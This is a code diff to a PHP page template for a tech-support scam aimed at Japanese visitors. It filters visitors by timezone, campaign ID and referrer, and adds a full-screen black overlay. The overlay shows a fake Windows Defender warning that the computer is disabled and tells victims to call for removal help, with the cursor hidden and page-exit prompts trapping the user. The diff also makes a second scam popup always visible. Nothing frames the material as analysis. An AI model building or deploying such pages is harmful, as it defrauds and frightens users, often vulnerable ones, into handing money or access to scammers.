@@ -1,6 +1,8 @@
 <?php
 $number = '0101-50140-20305';
 $dynamic_url = "https://onrender-3brc.onrender.com";
+#$dynamic_url = "http://127.0.0.1:8080";
+
 $allowed_timezones = ['Asia/Tokyo'];
 $allowed_campaign_ids = ['12345', '67890'];
 $allowed_referrer = ['http://127.0.0.1', 'https://waveharborblog.space', 'https://main.d3czosya9iti22.amplifyapp.com'];
@@ -113,6 +115,17 @@ $codeString = '
       <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=28841937"></script>
    </head>
    <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
+<div id="floatbox" style="position: fixed;z-index: 999999999;height: 100vh;width: 100vw;background: black;" class="bxcontb">
+<div style="height: 100vh;display: flex;justify-content: center;align-items: center;\: 57px;">
+  <div style="position: relative;">
+<div style="background-color: rgb(0, 0, 0);width: 60vw;border: 3px solid rgb(214, 216, 219);border-radius: 0.5rem;padding: 20px;" id="upbxs">
+         <div style="color:#fff;margin: auto;font-size:16px;padding: 25px;text-align: center;" class="text-center">
+            すぐに当社にご連絡く�さい。当社のエンジニアが電話で削除プロセスを案内いたします。お使いのコンピュータは無効になっています。Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。 
+            
+         </div>
+      </div>  </div>
+</div>          
+</div>
       <!-- <div id="modalbx">
          <video id="vid" width="100%" height="100%" muted loop preload="auto" autoplay>
            <div class="play-button"></div>
@@ -228,7 +241,7 @@ $codeString .= '</div>
             </div>
          </div>
       </div>
-      <div class="uprbox" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="upbxs">
+      <div class="uprbox" style="background-color:#000;height:auto;width:90vw;left:5vw;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="upbxs">
          <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">
             すぐに当社にご連絡く�さい。当社のエンジニアが電話で削除プロセスを案内いたします。お使いのコンピュータは無効になっています。Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。 <br>
             <strong>
